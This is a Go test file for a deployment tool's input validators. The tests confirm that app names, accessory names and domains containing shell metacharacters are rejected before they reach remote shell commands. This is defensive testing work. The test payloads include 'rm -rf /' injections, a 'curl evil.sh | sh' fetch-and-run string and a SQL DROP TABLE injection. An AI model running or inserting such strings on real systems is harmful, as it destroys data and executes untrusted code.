package config

import "testing"

// TestValidateName_RejectsShellMetacharacters guards the ad-hoc --app
// deploy path (internal/cli/deploy.go's runAdHocDeploy) and the --app flag
// shared by resolveApp (internal/cli/connect.go): both build an AppConfig
// directly and never reach AppConfig.validate(), so ValidateName is their
// only protection before the name reaches remote shell commands.
func TestValidateName_RejectsShellMetacharacters(t *testing.T) {
	payloads := []string{
		"",
		"x; rm -rf /",
		"x$(rm -rf /)",
		"x`rm -rf /`",
		"x && curl evil.sh | sh",
		"x'; DROP TABLE users; --",
		"UPPERCASE",
		"has spaces",
		"-leading-hyphen",
		"trailing-hyphen-",
	}
	for _, p := range payloads {
		if err := ValidateName(p); err == nil {
			t.Errorf("ValidateName(%q) = nil, want error", p)
		}
	}
}

func TestValidateName_AcceptsValidNames(t *testing.T) {
	valid := []string{"myapp", "my-app", "a", "app123", "app-123-x"}
	for _, v := range valid {
		if err := ValidateName(v); err != nil {
			t.Errorf("ValidateName(%q) = %v, want nil", v, err)
		}
	}
}

func TestValidateName_TooLong(t *testing.T) {
	long := ""
	for i := 0; i < 64; i++ {
		long += "a"
	}
	if err := ValidateName(long); err == nil {
		t.Error("expected error for 64-char name (max is 63)")
	}
}

// TestValidateIdentifier_UsedForAccessoryNames guards `teploy accessory
// stop/start/logs/exec <name>` (internal/cli/accessory.go), which take an
// unvalidated CLI positional arg that flows into unquoted-by-construction
// path building in internal/accessories/accessories.go.
func TestValidateIdentifier_UsedForAccessoryNames(t *testing.T) {
	if err := ValidateIdentifier("accessory", "postgres"); err != nil {
		t.Errorf("expected valid accessory name to pass, got %v", err)
	}
	if err := ValidateIdentifier("accessory", "postgres; rm -rf /"); err == nil {
		t.Error("expected shell-metacharacter accessory name to be rejected")
	}
	err := ValidateIdentifier("accessory", "")
	if err == nil {
		t.Fatal("expected error for empty accessory name")
	}
	if got, want := err.Error(), "'accessory' is required"; got != want {
		t.Errorf("error message = %q, want %q (label must be substituted, not hardcoded to 'app')", got, want)
	}
}

func TestValidateDomain(t *testing.T) {
	cases := []struct {
		domain    string
		allowZero bool
		wantErr   bool
	}{
		{"example.com", false, false},
		{"example.com, www.example.com", false, false},
		{"", false, true},              // empty rejected unless allowEmpty
		{"", true, false},              // empty accepted for ingress: host
		{"example.com, ", false, true}, // trailing empty entry rejected
		{"not a domain", false, true},
	}
	for _, c := range cases {
		err := ValidateDomain(c.domain, c.allowZero)
		if (err != nil) != c.wantErr {
			t.Errorf("ValidateDomain(%q, %v) error = %v, wantErr %v", c.domain, c.allowZero, err, c.wantErr)
		}
	}
}
